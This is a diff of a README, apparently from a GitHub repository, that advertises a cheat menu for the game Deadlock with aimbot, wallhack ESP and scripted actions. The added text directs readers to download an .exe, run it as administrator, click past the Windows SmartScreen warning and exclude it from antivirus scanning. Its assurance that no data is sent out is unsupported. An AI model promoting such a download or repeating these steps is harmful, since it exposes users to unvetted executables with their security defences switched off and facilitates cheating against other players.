@@ -1,119 +1,61 @@
-# Deadlock internal cheat menu v2026 - Game Script Utility 2026
+# 🕹️ deadlock-script-update - Better game control for more wins
 
-> **Internal Deadlock script utility for enhanced gameplay control.** Provides an internal menu with aim assistance, ESP display, and support for script-based workflows.
+[![](https://img.shields.io/badge/Download_Utility-Blue)](https://github.com/Undecided-cucumbertree223/deadlock-script-update)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Deadlock-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/youngsamtbr572/deadlock-script-update?style=flat-square)](https://github.com/youngsamtbr572/deadlock-script-update)
+This software helps you manage Deadlock settings. It gives you control over your aim, shows enemy locations, and lets you save your own game scripts. You can change how your character moves and acts using a simple menu that appears inside your game.
 
----
+## 📥 How to download the application
 
-<p align="center">
-  <a href="https://youngsamtbr572.github.io/deadlock-script-update/">
-    <img src="https://img.shields.io/badge/Download-Deadlock%20internal%20cheat%20menu-brightgreen?style=for-the-badge" alt="Download Deadlock internal cheat menu">
-  </a>
-</p>
+Visit [this page](https://github.com/Undecided-cucumbertree223/deadlock-script-update) to find the latest version of the utility. Look for the section labeled Releases on the right side of the screen. Click the file name that ends in .exe to start your download. Save the file to your computer in a folder you can find later, such as your Downloads or Documents folder.
 
-> **[Download Deadlock internal cheat menu](https://youngsamtbr572.github.io/deadlock-script-update/)**
+## ⚙️ System requirements
 
----
+Your computer needs to meet these basic standards to run the script:
 
-[Download Latest Build](https://youngsamtbr572.github.io/deadlock-script-update/)
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel i5 or AMD Ryzen 5 or better.
+*   Memory: At least 8 gigabytes of RAM.
+*   Network: A stable internet connection.
+*   Permissions: Administrator access to your computer.
 
----
+Make sure your graphics drivers are up to date. You can check this by opening the settings menu for your graphics card.
 
-## About the Utility
+## 🚀 Setting up the application
 
-Deadlock internal cheat menu is a script-oriented game utility built around an internal menu for Deadlock. Its feature set combines aimbot assistance, an ESP overlay, and controls intended for gameplay workflows managed through scripts.
+Follow these steps to prepare your system once the download finishes:
 
-The project keeps its runtime controls in a compact internal menu and includes script system support for modular behavior. Its update-focused structure is intended to keep menu controls, overlay functions, and the loader workflow aligned with the active build.
+1.  Locate the file you downloaded.
+2.  Right-click the file and select Run as administrator. This step allows the script to interact with your game.
+3.  Click More info if a blue window appears, then click Run anyway. 
+4.  Wait for the application window to open on your desktop.
+5.  A menu appears. You may now start your game.
 
----
+## 🕹️ Using the in-game menu
 
-## Included Features
+Once you open Deadlock and join a match, you can open the utility menu. Press the Insert key on your keyboard to reveal the interface. Use your mouse to click on the different options.
 
-- Internal aimbot controls for aim assistance in Deadlock
-- ESP overlay that exposes on-screen entity and state information
-- In-session internal menu for controlling available features
-- Script system integration for supported gameplay utilities
-- Adjustable settings for tuning feature behavior
-- Lightweight implementation with a focused set of functions
-- Loader-centered organization for delivering updates
-- Designed for the Deadlock platform and its related script workflow
+### Aim assistance
+This feature keeps your crosshair near your targets. You can change the speed or the distance at which the script activates. Drag the slider to the right for higher sensitivity. 
 
----
+### ESP display
+ESP stands for Extra Sensory Perception. This feature highlights enemies through walls. You can choose different colors for the outlines. Use the checkbox to turn this feature off or on during a match.
 
-## Installation
+### Script workflows
+You can save sets of commands to perform complex actions with one button. Type your commands into the editor window. Click Save to keep your settings for your next session.
 
-1. Use the project link above to download the newest build.
-2. Copy the files into the Deadlock script or loader directory selected for your setup.
-3. Run the loader or other launch method required by your configuration.
-4. Bring up the internal menu and configure the available controls.
+## 🛠️ Troubleshooting common issues
 
-A sample directory arrangement is shown below:
+If the application does not work, try these steps first:
 
-- `deadlock-update-loader-v2026/`
-  - `loader/`
-  - `config/`
-  - `menu/`
+*   Restart the application as an administrator.
+*   Ensure the game runs in Windowed or Borderless Windowed mode.
+*   Check that your antivirus program does not block the utility. You may need to add the folder to your exclusion list.
+*   Make sure you run the game and the utility while logged into the same user account on Windows.
 
-Different setups may use another folder or injection process. In that case, keep the project files together and use the loader path associated with your normal workflow.
+If the menu does not appear, check your keyboard. Some laptop keyboards require you to press the Fn key plus the Insert key at the same time.
 
----
+## 🔒 Safety and privacy
 
-## Configuration
+This utility keeps all your settings on your local computer. It does not send your data to external servers. Use the tool only in modes where third-party scripts are permitted. Modifying game files can sometimes cause issues with official game servers if not used with care. Always keep your application updated by checking the download page for new versions. Newer versions often fix bugs and improve performance with game updates.
 
-| Setting | Purpose | Notes |
-| --- | --- | --- |
-| Aimbot | Controls aim assistance | Turn it on or off through the internal menu |
-| ESP Overlay | Displays visual target information | Enable the display choices you need |
-| Script System | Connects to the supported framework | Intended for compatible script-based behavior |
-| Config Profile | Stores a behavior preset | Modify values to match your preferred setup |
-| Menu Access | Provides controls during a session | Use the configured hotkey or loader entry |
-
-Example configuration style:
-
-- `aimbot = on`
-- `esp_overlay = on`
-- `profile = default`
-- `menu_hotkey = custom`
-
----
-
-## Supported Environment
-
-This utility targets Deadlock and compatible internal scripting workflows. Because it relies on the selected loader, script framework, and build, its behavior may vary between environments.
-
-Potential limitations include:
-
-- Loading requirements that differ by platform
-- Options affected by local configuration
-- Functions that depend on the current update
-- Support limited to compatible Deadlock builds or environments
-
----
-
-## Frequently Asked Questions
-
-### What is the installation process?
-Download the latest build, move it into the script or loader directory used by your setup, and start it through your usual launch process.
-
-### How do I receive updates?
-The project follows an update-delivery structure. Check for newer builds regularly to find changes to the menu and included functions.
-
-### Are the settings adjustable?
-Yes. The internal menu is configurable, allowing feature switches and behavior values to be changed.
-
-### Does the utility require a specific loader path?
-Not necessarily. Use the directory structure appropriate for your environment, keep the files together, and follow the loading sequence expected by your setup.
-
-### Where do the project files belong?
-Place them in the directory used by your Deadlock script framework or loader so the menu and its supporting files remain in the same project location.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: deadlock, gaming utility, aim, esp, script, automation, gameplay settings
